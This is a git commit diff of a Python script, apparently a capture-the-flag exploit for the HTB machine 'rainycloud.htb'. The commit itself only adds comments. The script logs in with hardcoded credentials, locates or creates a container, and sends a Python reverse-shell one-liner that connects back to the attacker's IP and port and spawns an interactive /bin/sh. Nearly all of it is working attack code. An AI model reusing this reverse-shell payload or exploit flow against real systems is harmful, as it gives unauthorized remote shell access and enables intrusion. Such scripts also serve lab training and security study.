62f64da9b1d15a66a8cdeb1c60f389dbcbf71420
akhils911dev <dev.akhils911@gmail.com>
2022-10-22 17:26:05 +0530

    Rebuild

--- rainyDay/rshell.py
+++ rainyDay/rshell.py
@@ -5,6 +5,7 @@ import re
 session = requests.Session()
 
 class rshell:
+	# Initialize Class + web rshell methods
 
 	def __init__(self,ip,port):
 		self.local_ip = ip
@@ -13,15 +14,18 @@ class rshell:
 		self.container_url = f"http://rainycloud.htb/containers"
 		self.auth = {"username":"gary","password":"rubberducky"}
 
+    # Post request for user login
 	def UserLogin(self):
 		r = session.post(url=self.login_url,data=self.auth)
 		print("[+] Login as user gary")
-
+    
+    # Request for find the container ID
 	def FindContainerId(self):
 		r = session.get(url=self.container_url)
 		ID = re.findall("[A-Fa-f0-9]{64}",r.text)
 		return ID
-
+    
+    # Run command on containers
 	def RunCommand(self,ContainerID):
 		RawCommand = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.local_ip}\",{self.local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
 		payload = f"python3 -c \'{RawCommand}\'"
@@ -29,7 +33,7 @@ class rshell:
 		r = session.post(url=self.container_url,data=data)
 		print("[+] Code Executed")
 
-
+    # Create new container
 	def CreateContainer(self,ContainerName="new"):
 		data = {"action":"create"+ ContainerName,"id":"alpine-python"}
 		r = session.post(url=self.container_url,data=data)
@@ -42,6 +46,7 @@ Rainycloud = rshell(sys.argv[1],sys.argv[2])
 print("[+] Trying to login")
 Rainycloud.UserLogin()
 
+# If there is a container we fetch the container id and run the payload else script will create a container and run the payload for getting the reverse shell
 ContainerID = Rainycloud.FindContainerId()
 
 if not ContainerID:
